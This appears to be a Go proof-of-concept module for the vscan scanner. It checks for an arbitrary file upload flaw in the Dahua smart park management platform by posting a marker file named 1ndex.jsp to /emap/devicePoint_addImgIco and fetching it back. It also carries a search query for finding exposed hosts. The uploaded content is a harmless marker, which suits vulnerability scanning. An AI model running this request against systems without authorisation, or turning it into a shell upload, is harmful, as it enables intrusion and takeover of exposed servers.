package dahua

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"regexp"
	"strings"
)

// 0x1 漏洞简介
// 大华智慧园区综合管理平台是一个集智能化、信息化、网络化、安全化为一体的智慧园区管理平台，旨在为园区提供一站式解决方案，包括安防、能源管理、环境监测、人员管理、停车管理等多个方面。 大华智慧园区综合管理平台存在在野 0day 漏洞，攻击者可以通过请求/emap/devicePoint_addImgIco接口任意上传文件，导致系统被攻击与控制。
//
// 0x2 测绘语法
// app="dahua-智慧园区综合管理平台"
func Dahua_devicePoint_addImgIco_upload_rce(u string) bool {

	var payload = "--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"1ndex.jsp\"\r\nContent-Type: application/octet-stream\r\nContent-Transfer-Encoding: binary\r\n\r\nEkeyrNu4cNSk-ppZB0\r\n--A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT--"

	header := make(map[string]string)
	header["Content-Type"] = "multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT"

	if req, err := pkg.HttpRequset(u+"/emap/devicePoint_addImgIco?hasSubsystem=true", "POST", payload, false, header); err == nil {
		//pkg.GoPocLog(req.Body)
		if req.StatusCode == 200 && strings.Contains(req.Body, "data") {
			str := req.Body
			var pattern = `"data":"([^"]*)"`
			re := regexp.MustCompile(pattern)
			if re.MatchString(str) {
				resourceUuid := re.FindStringSubmatch(str)[1]
				if req2, err := pkg.HttpRequset(u+"/upload/emap/society_new/"+resourceUuid, "GET", "", false, nil); err == nil {
					if req2.StatusCode == 200 && strings.Contains(req2.Body, "EkeyrNu4cNSk") {
						pkg.GoPocLog(fmt.Sprintf("Found vuln dahua upload_rce|%s\n", u+"/upload/emap/society_new/"+resourceUuid))
						return true
					}
				}
				//fmt.Println(resourceUuid)
			}
			//resourceUuid := re.FindStringSubmatch(req.Body)[1]

		}
	}
	return false
}
